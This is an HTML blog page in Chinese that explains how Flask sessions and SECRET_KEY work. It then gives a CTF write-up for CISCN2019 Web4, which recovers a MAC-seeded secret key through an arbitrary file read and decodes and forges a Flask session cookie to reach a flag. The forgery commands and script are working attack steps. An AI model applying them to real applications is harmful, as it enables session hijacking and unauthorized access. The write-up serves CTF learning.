@@ -1,0 +1,672 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="H0ne">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="首先还是先从概念入手，最近学习越学越来越觉得自己菜 Flask-session：概念：session咱们都知道是基于cookjie实现的，保存在服务器的键值对，同时在浏览器的cookie中也会保存相同的随机字符串，用来再次请求时拿出来，进行验证。 1注意：Flask中的session是保存在浏览器中的，默认的key是session（加密的cookie），当然也可以将其保存在数据库中 flask中有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Flask-session用法">
+<meta property="og:url" content="http://example.com/2023/04/20/Flask-session%E7%94%A8%E6%B3%95/index.html">
+<meta property="og:site_name" content="H0ne&#39;s Blog">
+<meta property="og:description" content="首先还是先从概念入手，最近学习越学越来越觉得自己菜 Flask-session：概念：session咱们都知道是基于cookjie实现的，保存在服务器的键值对，同时在浏览器的cookie中也会保存相同的随机字符串，用来再次请求时拿出来，进行验证。 1注意：Flask中的session是保存在浏览器中的，默认的key是session（加密的cookie），当然也可以将其保存在数据库中 flask中有">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/01038cf4ad054e878028abfa368fe068.gif">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a6d5a5d174054f7fb0a053f0bce09280.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d9eb45d846b74e6ab167580a75bb5d42.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9d6ece7e20c84d868ff780bccf8ac64d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c230f94008f24d9697bea378b9e098be.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/1e7bff5f618947b180d6a3aeed814a7b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/fc97970dc3244085898374fc1679e400.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/242c87ef72e84b0786cf655a0007c425.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/37148d5068bd468793a1911d522cfa3f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="article:published_time" content="2023-04-20T15:33:27.620Z">
+<meta property="article:modified_time" content="2022-04-12T15:06:48.000Z">
+<meta property="article:author" content="H0ne">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/01038cf4ad054e878028abfa368fe068.gif">
+  
+  
+  
+  <title>Flask-session用法 - H0ne&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/fluid-extension.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>H0ne&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Flask-session用法"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-20 23:33" pubdate>
+          2023年4月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          38 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Flask-session用法</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>首先还是先从概念入手，最近学习越学越来越觉得自己菜<br><img src="https://img-blog.csdnimg.cn/01038cf4ad054e878028abfa368fe068.gif" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="Flask-session："><a href="#Flask-session：" class="headerlink" title="Flask-session："></a>Flask-session：</h2><h3 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h3><p>session咱们都知道是基于cookjie实现的，保存在服务器的键值对，同时在浏览器的cookie中也会保存相同的随机字符串，用来再次请求时拿出来，进行验证。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">注意：Flask中的<span class="hljs-keyword">session</span>是保存在浏览器中的，默认的key是<span class="hljs-keyword">session</span>（加密的cookie），当然也可以将其保存在数据库中<br></code></pre></td></tr></table></figure>
+<p>flask中有一个session对象，它允许你在不同请求间存储特定用户的信息。它是在cookie的基础上实现的，并且对cookie进行密钥签名要使用会话，你需要设置一个密钥</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">同request一样，<span class="hljs-keyword">session</span>基于上下文管理<br></code></pre></td></tr></table></figure>
+<h3 id="SECRET-KEY："><a href="#SECRET-KEY：" class="headerlink" title="SECRET_KEY："></a>SECRET_KEY：</h3><p>flask的session是通过加密后保存在cookie中的，有加密就需要有解密用的密钥，只要用到了flask的session模块，就一定要配置’SECRET_KEY’这个全局宏。一般设置为24位的字符。<br><strong>配置方法一：</strong><br>新建一个config.py文件配置secret_key</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">SECRET_KEY=<span class="hljs-string">&#x27;XXXXXXXXXX&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>然后在运行主文件里面添加config文件里面的内容<br>main.py:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,session<br><span class="hljs-keyword">import</span> config<br>app=Flask(__name__)<br></code></pre></td></tr></table></figure>
+<p><strong>配置方法二：</strong><br>直接在主运行模块里面配置，配置config的时候也是和操作字典是一样的<br>main.py：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,session<br>app=Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SESSION_KEY&#x27;</span>]=<span class="hljs-string">&#x27;XXXXXX&#x27;</span><br>或：app.secret_key=<span class="hljs-string">&#x27;xxxxxxx&#x27;</span><br></code></pre></td></tr></table></figure>
+<h3 id="session的操作命令："><a href="#session的操作命令：" class="headerlink" title="session的操作命令："></a>session的操作命令：</h3><p>session的操作本质和操作字典一样<br>增：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">session[<span class="hljs-string">&#x27;username&#x27;</span>] ＝ <span class="hljs-string">&#x27;xxx&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>查：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">result=session[<span class="hljs-string">&#x27;key&#x27;</span>]       <span class="hljs-comment">#如果key不存在，会raise Error</span><br>result=session.get(<span class="hljs-string">&#x27;key&#x27;</span>)   <span class="hljs-comment">#如果key不存在，返回None</span><br></code></pre></td></tr></table></figure>
+<p>删：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">session.pop(<span class="hljs-string">&#x27;key&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<p>清空:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">session.clear<br></code></pre></td></tr></table></figure>
+<h3 id="session的流程："><a href="#session的流程：" class="headerlink" title="session的流程："></a>session的流程：</h3><p>第一次请求进来，会把session所有的值都放入内存，对session的增删查改的命令都是在内存中进行的</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">SecureCookieSessionInterface</span>(<span class="hljs-type">SessionInterface</span>):</span><br><span class="hljs-class">   open_session <span class="hljs-comment">--&gt; 打开，获取 app.session_cookie_name获取加密的session, 然后进行解密, save_session  --&gt; 对操作完的sesison进行加密 保存</span></span><br></code></pre></td></tr></table></figure>
+<h3 id="flask中-session的流程详解"><a href="#flask中-session的流程详解" class="headerlink" title="flask中 session的流程详解"></a>flask中 session的流程详解</h3><p>1, 用户请求的request进来，实例化RequestContext，创建request_context对象，初始化session为空<br><img src="https://img-blog.csdnimg.cn/a6d5a5d174054f7fb0a053f0bce09280.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d9eb45d846b74e6ab167580a75bb5d42.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>2, 当接受到用户请求之后，会调用Flask对象的session_interface对象的open_session方法，以此来获取一个session对象。<br>3, 数据返回给用户，并把内容中的session重新保存<br><img src="https://img-blog.csdnimg.cn/9d6ece7e20c84d868ff780bccf8ac64d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c230f94008f24d9697bea378b9e098be.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>参考链接：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhangyukun555/article/details/88260582">https://www.cnblogs.com/big-handsome-guy/p/8550310.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/big-handsome-guy/p/8550310.html">https://www.cnblogs.com/big-handsome-guy/p/8550310.html</a></p>
+<h2 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2><p>点击readsomething发现url添加了百度，url里多了url参数，猜测存在任意文件读取。<br>读取&#x2F;api&#x2F;app.py 有源码 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding:utf-8</span><br><span class="hljs-keyword">import</span> re, random, uuid, urllib<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request<br><br>app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">True</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;www-data&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    <span class="hljs-keyword">try</span>:<br>        url = request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        m = re.findall(<span class="hljs-string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)<br>        n = re.findall(<span class="hljs-string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> m <span class="hljs-keyword">or</span> n:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No Hack&#x27;</span><br>        res = urllib.urlopen(url)<br>        <span class="hljs-keyword">return</span> res.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(ex)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no response&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">and</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;fuck&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>).read()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access denied&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<br>        debug=<span class="hljs-literal">True</span>,<br>        host=<span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    )<br><br></code></pre></td></tr></table></figure>
+<p>这就是一个flask-session题，&#96;&#96;</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure>
+<p>读取&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address可以得到了mac地址<br><img src="https://img-blog.csdnimg.cn/1e7bff5f618947b180d6a3aeed814a7b.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>然后咱们主要是或者secretkey</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python2">Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:25:05) [MSC v.1500 64 bit (AMD64)] on win32<br>Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.<br>&gt;&gt;&gt; import random<br>&gt;&gt;&gt; random.seed(0x46948203283a)<br>&gt;&gt;&gt; print(str(random.random()*233))<br>103.025665766<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/fc97970dc3244085898374fc1679e400.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>用脚本解码我们原来的session</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<br><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decryption</span>(<span class="hljs-params">payload</span>):<br>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br>    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br><br>    decompress = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):<br>        payload = payload[<span class="hljs-number">1</span>:]<br>        decompress = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">try</span>:<br>        payload = base64_decode(payload)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span><br>                         <span class="hljs-string">&#x27;an exception&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> decompress:<br>        <span class="hljs-keyword">try</span>:<br>            payload = zlib.decompress(payload)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span><br>                             <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    s = <span class="hljs-string">&quot;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.YlWPqw.VtwY8brhyAARA4xqls4ihtreLtc&quot;</span><br>    <span class="hljs-built_in">print</span>(decryption(s.encode()))<br></code></pre></td></tr></table></figure>
+<p>得到{‘username’: b’www-data’}<br><img src="https://img-blog.csdnimg.cn/242c87ef72e84b0786cf655a0007c425.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>{‘username’: b’www-data’}改为{‘username’: b’fuck’},用flask-session插件配合秘钥加密。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">G:\flask-session-manager\flask-session-cookie-manager-master&gt;python3 flask_session_cookie_manager3.py encode -s <span class="hljs-number">103.025665766</span> -t <span class="hljs-string">&quot;&#123;&#x27;username&#x27;:b&#x27;fuck&#x27;&#125;&quot;</span><br>eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.YlWUug.asVFH_xqPhDtxofvKrBa6XqUjNs<br></code></pre></td></tr></table></figure>
+<p>伪造session,携带伪造的session访问flag路由即可拿到flag<br><img src="https://img-blog.csdnimg.cn/37148d5068bd468793a1911d522cfa3f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Flask-session用法</div>
+      <div>http://example.com/2023/04/20/Flask-session用法/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>H0ne</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/20/HTB-%20Armageddon/" title="HTB-Armageddon">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB-Armageddon</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/20/Docker%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/" title="Docker笔记（一）">
+                        <span class="hidden-mobile">Docker笔记（一）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
